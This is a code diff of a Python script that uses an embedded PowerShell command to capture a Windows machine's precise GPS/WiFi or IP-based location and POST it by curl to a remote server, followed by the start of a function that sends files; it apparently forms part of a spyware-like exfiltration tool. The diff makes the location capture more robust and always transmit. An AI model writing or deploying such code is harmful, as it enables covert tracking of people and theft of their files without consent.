@@ -11,39 +11,40 @@ import subprocess
 import shlex
 def get_location_and_send():
     ps_command = r'''
- Add-Type -AssemblyName System.Device
-$geo = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)
-$geo.Start()
-$i=0
-while (($geo.Status -ne 'Ready') -and ($geo.Permission -ne 'Denied') -and ($i -lt 30)) {
-    Start-Sleep -Milliseconds 200
-    $i++
-}
-if ($geo.Permission -eq 'Denied' -or $geo.Status -ne 'Ready' -or $geo.Position.Location.HorizontalAccuracy -gt 500) {
+    Add-Type -AssemblyName System.Device
+    $geo = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)
+    $geo.Start()
+    $i=0
+    while (($geo.Status -ne 'Ready') -and ($geo.Permission -ne 'Denied') -and ($i -lt 30)) {
+        Start-Sleep -Milliseconds 200
+        $i++
+    }
     try {
-        $ip = Invoke-RestMethod ipinfo.io
-        $result = @{
-            source    = "IP"
-            city      = $ip.city
-            region    = $ip.region
-            country   = $ip.country
-            latitude  = $ip.loc.Split(',')[0]
-            longitude = $ip.loc.Split(',')[1]
-            accuracy  = "approximate"
+        if ($geo.Status -eq 'Ready' -and $geo.Permission -ne 'Denied' -and $geo.Position.Location.HorizontalAccuracy -le 500) {
+            $c = $geo.Position.Location
+            $result = @{
+                source    = "GPS/WiFi"
+                latitude  = $c.Latitude
+                longitude = $c.Longitude
+                accuracy  = [math]::Round($c.HorizontalAccuracy,2)
+            }
+        } else {
+            # fallback IP
+            $ip = Invoke-RestMethod ipinfo.io
+            $result = @{
+                source    = "IP"
+                city      = $ip.city
+                region    = $ip.region
+                country   = $ip.country
+                latitude  = $ip.loc.Split(',')[0]
+                longitude = $ip.loc.Split(',')[1]
+                accuracy  = "approximate"
+            }
         }
     } catch {
         $result = @{ error = "location_unavailable" }
     }
-} else {
-    $c = $geo.Position.Location
-    $result = @{
-        source    = "GPS/WiFi"
-        latitude  = $c.Latitude
-        longitude = $c.Longitude
-        accuracy  = [math]::Round($c.HorizontalAccuracy,2)
-    }
-}
-$result | ConvertTo-Json
+    $result | ConvertTo-Json -Compress
     '''
     ps_result = subprocess.run(
         ["powershell", "-NoProfile", "-Command", ps_command],
@@ -51,11 +52,10 @@ $result | ConvertTo-Json
     )
     location_text = ps_result.stdout.strip()
     if not location_text:
-        print("No location found")
-        return False
+        location_text = '{"error":"location_unavailable"}'
     curl_cmd = f'curl -X POST {SERVER_URL}/get-location -H "Content-Type: text/plain" -d "{location_text}"'
     subprocess.run(curl_cmd, shell=True)
-    return True
+    print("Location sent to server.")
 def send_files(args):
     files_to_send = args[1:]
     if not files_to_send:
